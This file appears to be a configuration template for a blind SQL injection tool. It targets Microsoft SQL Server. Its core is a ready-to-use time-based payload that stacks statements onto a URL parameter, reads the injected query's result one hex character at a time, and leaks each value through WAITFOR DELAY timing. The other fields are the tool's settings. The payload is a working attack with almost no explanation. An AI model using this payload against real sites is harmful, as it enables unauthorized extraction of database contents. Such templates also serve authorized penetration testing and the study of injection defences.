<bsql>
	<author>Ferruh Mavituna - http://ferruh.mavituna.com </author>
  <name>Template - SQL Server - Deep Blind SQL Injection</name>

  <query><![CDATA[{{URL:Enter the URL of websites like http://www.example.com/}}/?p=1;DECLARE @x as int; DECLARE @w as char(6);SET @x=ASCII(SUBSTRING(master.dbo.fn_varbintohexstr(CAST(({INJECTION}) as varbinary(8000))),{POSITION}+2,1));IF @x>97 SET @x=@x-87 ELSE SET @x=@x-48;SET @w=CHAR(48)+CHAR(58)+CHAR(48)+CHAR(58)+CAST(@x*2 as char);WAITFOR DELAY @w]]></query>

  <trueresponse><![CDATA[King]]></trueresponse>
	<falseresponse><![CDATA[Oracle]]></falseresponse>
	<detectiontype><![CDATA[DeepBlind]]></detectiontype>
	<regex><![CDATA[False]]></regex>
	<case><![CDATA[False]]></case>
	<redirect><![CDATA[False]]></redirect>
	<maxlength><![CDATA[200]]></maxlength>
	<startposition><![CDATA[1]]></startposition>
</bsql>
